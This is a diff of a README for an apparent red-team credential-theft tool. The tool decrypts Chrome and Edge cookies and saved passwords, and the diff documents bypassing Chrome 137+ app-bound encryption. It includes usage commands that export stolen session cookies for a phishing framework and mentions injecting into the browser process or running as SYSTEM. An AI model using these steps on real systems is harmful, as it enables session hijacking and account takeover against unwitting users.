@@ -7,7 +7,7 @@ Once the Cookies/Login Data file(s) are downloaded, the python decryption script
 
 Chrome & Edge 127+ Updates: new chromium browser cookies (v20) use the app bound key to encrypt the cookies. As a result, this makes retrieving the app_bound_encrypted_key slightly more difficult. Thanks to [snovvcrash](https://gist.github.com/snovvcrash/caded55a318bbefcb6cc9ee30e82f824) this process can be accomplished without having to escalate your privileges. The catch is your process must be running out of the web browser's application directory. i.e. must inject into Chrome/Edge or spawn a beacon from the same application directory as the browser. 
 
-Latest update allows you to decrypt cookies as SYSTEM and without having to inject into the browser process! Shoutout to @sdemius for the discovering how to decrypt the Chrome's [PostProcessData](https://source.chromium.org/chromium/chromium/src/+/main:chrome/elevation_service/elevator.cc;l=216;bpv=1) function and @b1scoito [explanation](https://github.com/moonD4rk/HackBrowserData/issues/431#issuecomment-2606665195)!  
+Latest update allows you to decrypt cookies as SYSTEM and without having to inject into the browser process! Shoutout to @sdemius for the discovering how to decrypt the Chrome's [PostProcessData](https://source.chromium.org/chromium/chromium/src/+/main:chrome/elevation_service/elevator.cc;l=216;bpv=1) function and @b1scoito [explanation](https://github.com/moonD4rk/HackBrowserData/issues/431#issuecomment-2606665195)! Chrome 137+ changed the PostProcessData() function once again, shoutout to [@runassu](https://github.com/runassu/chrome_v20_decryption) for figuring it out! 
  
 ## BOF Usage
 ```
@@ -50,7 +50,7 @@ pip3 install -r requirements.txt
 Usage
 ```
 python3 decrypt.py -h                                                                                                                                                                      
-usage: decrypt.py [-h] -k KEY -o {cookies,passwords,cookie-editor,cuddlephish,firefox} -f FILE
+usage: decrypt.py [-h] -k KEY -o {cookies,passwords,cookie-editor,cuddlephish,firefox} -f FILE [--chrome-aes-key CHROME_AES_KEY]
 
 Decrypt Chromium cookies and passwords given a key and DB file
 
@@ -60,6 +60,8 @@ options:
   -o {cookies,passwords,cookie-editor,cuddlephish,firefox}, --option {cookies,passwords,cookie-editor,cuddlephish,firefox}
                         Option to choose
   -f FILE, --file FILE  Location of the database file
+  --chrome-aes-key CHROME_AES_KEY
+                        Chrome AES Key
 ```
 
 Examples:
@@ -81,7 +83,11 @@ Name: user_session
 Cookie: x123.....
 Expires: Nov 11 2023 21:25:22
 ```
-
+Decrypt Chrome Cookies with Chrome AES Key
+```
+python3 decrypt.py --chrome-aes-key '\x8e\....' -k "\x03\...." -o cuddlephish -f ChromeCookies.db
+Cookies saved to cuddlephish_2025-07-03_01-53-57.json
+```
 Decrypt Chrome/Edge Cookies File and save to json
 ```
 python .\decrypt.py -k "\xec\xfc...." -o cookie-editor -f ChromeCookies.db
@@ -137,5 +143,5 @@ Decrypt Cookies and Login Data:
 https://github.com/login-securite/DonPAPI <br>
 App Bound Key Decryption:
 https://gist.github.com/snovvcrash/caded55a318bbefcb6cc9ee30e82f824 <br>
-Decrypt Chrome 130+ Cookies 
-https://github.com/runassu/chrome_v20_decryption/issues/14#issuecomment-2708796234 <br>
+Decrypt Chrome 137+ Cookies
+https://github.com/runassu/chrome_v20_decryption
